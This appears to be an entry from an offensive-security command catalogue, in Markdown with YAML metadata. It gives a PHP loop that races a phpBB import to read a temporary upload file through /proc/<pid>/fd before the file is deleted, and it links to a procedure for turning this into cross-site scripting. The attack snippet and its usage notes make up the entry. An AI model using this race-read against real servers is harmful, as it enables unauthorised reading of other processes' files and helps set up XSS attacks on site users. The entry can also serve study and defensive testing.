---
data: >-
  <?php

  while($f= @file("/proc/<pid of php server>/fd/<file descriptor assciated with
  the tmp file>")){

  var_dump($f);

  }
tags:
  - race-condition
  - file-read
type: command
output: Dumps content of temporary file if read before deletion
executor: php
platforms:
  - Linux
id: 95dbde9b-8b69-4b34-959f-c2a8e7711912
created_at: '2025-12-14T17:26:49.104Z'
updated_at: '2025-12-14T17:26:49.104Z'
verified: false
validated: true
submitted: true
---
# emulate-import-race-read

## Command

```php
<?php
while($f= @file("/proc/<pid of php server>/fd/<file descriptor assciated with the tmp file>")){
var_dump($f);
}
?>
```

## Description

PHP script emulating the phpBB import's file() call to read a temporary upload file via /proc fd in a race condition, dumping content before deletion for XSS payload capture.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /proc/<pid>/fd/<fd> | Path to process FD pointing to /tmp file | Yes |

## Examples

### Basic Usage

```php
# Replace <pid> and <fd> with actual values
```

### Advanced Usage

Run in loop for racing multiple attempts.

## Expected Output

Dumps array of file lines if successful read.

## Related

- [[procedures/Exploit-Race-Condition-for-XSS-via-Proc-File-Descriptors]]
